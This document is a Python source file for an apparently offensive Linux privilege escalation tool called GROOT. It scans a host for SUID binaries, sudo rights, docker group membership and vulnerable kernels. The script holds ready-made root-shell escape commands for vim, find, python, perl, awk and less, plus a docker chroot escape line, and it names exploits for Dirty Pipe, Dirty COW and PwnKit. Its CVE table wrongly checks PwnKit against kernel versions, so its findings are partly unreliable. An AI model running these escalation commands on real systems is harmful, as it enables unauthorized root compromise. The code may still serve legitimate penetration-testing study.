#!/usr/bin/env python3
"""
GROOT-like Automated Linux Privilege Escalation Tool
Educational/Research Purpose - Authorized Security Testing Only
"""

import os
import sys
import subprocess
import platform
import json
import re
import argparse
from datetime import datetime
from pathlib import Path

# Colors for terminal output
class Colors:
    RED = '\033[0;31m'
    GREEN = '\033[0;32m'
    YELLOW = '\033[1;33m'
    BLUE = '\033[0;34m'
    CYAN = '\033[0;36m'
    MAGENTA = '\033[0;35m'
    NC = '\033[0m'
    BOLD = '\033[1m'

class Groot:
    def __init__(self):
        self.version = "1.0"
        self.kernel = platform.release()
        self.arch = platform.machine()
        self.distro = self._get_distro()
        self.exploits_dir = Path(__file__).parent / "exploits"
        self.results = []
        self.root_obtained = False
        
    def _get_distro(self):
        try:
            with open('/etc/os-release', 'r') as f:
                for line in f:
                    if line.startswith('PRETTY_NAME='):
                        return line.split('=')[1].strip().strip('"')
        except:
            pass
        return "Unknown"
    
    def banner(self):
        print(f"""
{Colors.CYAN}╔═══════════════════════════════════════════════════════════════╗
║                                                               ║
║   {Colors.GREEN}[ GROOT ]{Colors.CYAN} Automated Linux Privilege Escalation Tool v{self.version}{Colors.CYAN}  ║
║                                                               ║
╚═══════════════════════════════════════════════════════════════╝{Colors.NC}
""")
        print(f"{Colors.YELLOW}[+] Target System:{Colors.NC}")
        print(f"    Kernel: {Colors.CYAN}{self.kernel}{Colors.NC}")
        print(f"    Arch:   {Colors.CYAN}{self.arch}{Colors.NC}")
        print(f"    Distro: {Colors.CYAN}{self.distro}{Colors.NC}")
        print(f"    User:   {Colors.CYAN}{os.getuid()} ({'root' if os.getuid() == 0 else 'non-root'}){Colors.NC}")
        print()
    
    def log(self, msg, status="info"):
        timestamp = datetime.now().strftime("%H:%M:%S")
        if status == "info":
            print(f"{Colors.BLUE}[{timestamp}] [*]{Colors.NC} {msg}")
        elif status == "success":
            print(f"{Colors.GREEN}[{timestamp}] [✓]{Colors.NC} {msg}")
        elif status == "warning":
            print(f"{Colors.YELLOW}[{timestamp}] [!]{Colors.NC} {msg}")
        elif status == "error":
            print(f"{Colors.RED}[{timestamp}] [✗]{Colors.NC} {msg}")
        elif status == "critical":
            print(f"{Colors.RED}[{timestamp}] [CRITICAL]{Colors.NC} {msg}")
    
    def check_suid_exploits(self):
        self.log("Scanning for SUID exploitation vectors...")
        suid_bins = self._find_suid_binaries()
        dangerous_suids = {
            'nmap': '--interactive',
            'vim': '-c \':py import os; os.execl(\"/bin/sh\", \"sh\")\'',
            'vi': '-c \':py import os; os.execl(\"/bin/sh\", \"sh\")\'',
            'find': '-exec /bin/sh -p \\; -quit',
            'bash': '-p',
            'sh': '-p',
            'python': '-c "import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\")"',
            'python3': '-c "import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\")"',
            'perl': '-e \'exec "/bin/sh";\'',
            'awk': '\'BEGIN {system("/bin/sh -p")}\'',
            'less': '!/bin/sh',
            'more': '!/bin/sh',
        }
        found = []
        for binary in suid_bins:
            bin_name = os.path.basename(binary)
            for dangerous, method in dangerous_suids.items():
                if dangerous in bin_name:
                    found.append((binary, method))
                    self.log(f"Found dangerous SUID: {binary}", "warning")
                    self.log(f"  -> Exploit: {method}", "critical")
        return bool(found)
    
    def _find_suid_binaries(self):
        try:
            result = subprocess.run(['find', '/', '-perm', '-4000', '-type', 'f'], 
                                capture_output=True, text=True, timeout=30)
            return result.stdout.strip().split('\n') if result.stdout else []
        except:
            return []
    
    def check_sudo_exploits(self):
        self.log("Checking sudo privileges...")
        try:
            sudo_list = subprocess.run(['sudo', '-l'], capture_output=True, text=True, timeout=10)
            output = sudo_list.stdout + sudo_list.stderr
            if 'ALL' in output and 'NOPASSWD' in output:
                self.log("FULL SUDO ACCESS WITHOUT PASSWORD!", "critical")
            dangerous = ['vim', 'vi', 'nano', 'less', 'find', 'bash', 'python', 'nmap']
            for cmd in dangerous:
                if cmd in output:
                    self.log(f"Sudo access to {cmd} - EXPLOITABLE!", "warning")
            return True
        except:
            return False
    
    def check_docker_escape(self):
        self.log("Checking Docker escape vectors...")
        try:
            groups = subprocess.run(['groups'], capture_output=True, text=True).stdout
            if 'docker' in groups:
                self.log("DOCKER GROUP FOUND - ESCAPE POSSIBLE!", "critical")
                self.log("Run: docker run -v /:/mnt --rm -it alpine chroot /mnt sh", "warning")
                return True
        except:
            pass
        return False
    
    def check_kernel_cves(self):
        self.log("Matching kernel against CVE database...")
        kernel_parts = self.kernel.split('-')[0]
        cve_db = {
            "CVE-2024-1086": {"affected": [("5.14", "6.6.14")], "exploit": "exploit_nftables_uaf"},
            "CVE-2022-0847": {"affected": [("5.8", "5.15.25")], "exploit": "exploit_dirtypipe"},
            "CVE-2021-4034": {"affected": [("0", "99.99")], "exploit": "exploit_pwnkit"},
            "CVE-2016-5195": {"affected": [("2.6.22", "4.8.3")], "exploit": "exploit_dirtycow"},
        }
        for cve_id, info in cve_db.items():
            if self._version_in_range(kernel_parts, info["affected"]):
                self.log(f"VULNERABLE: {cve_id}", "critical")
                self.log(f"  -> Exploit: {info['exploit']}", "warning")
        return False
    
    def _version_in_range(self, version, ranges):
        def v2n(v):
            parts = v.split('.')
            return sum(int(x) * (100**i) for i, x in enumerate(reversed(parts[:3])))
        try:
            v_num = v2n(version.split('-')[0])
            for min_v, max_v in ranges:
                if v2n(min_v) <= v_num <= v2n(max_v):
                    return True
        except:
            pass
        return False
    
    def full_scan(self):
        self.banner()
        self.log("Starting GROOT automated scan...")
        checks = [
            ("SUID Exploits", self.check_suid_exploits),
            ("Sudo Privileges", self.check_sudo_exploits),
            ("Docker Escape", self.check_docker_escape),
            ("Kernel CVEs", self.check_kernel_cves),
        ]
        for name, check_func in checks:
            try:
                check_func()
            except Exception as e:
                self.log(f"Check '{name}' failed: {e}", "error")
        self.log("Scan complete!")

def main():
    parser = argparse.ArgumentParser(description='GROOT - Automated Linux Privilege Escalation')
    args = parser.parse_args()
    groot = Groot()
    if os.getuid() == 0:
        print(f"{Colors.GREEN}[+] Already running as root!{Colors.NC}")
        return
    groot.full_scan()

if __name__ == '__main__':
    main()
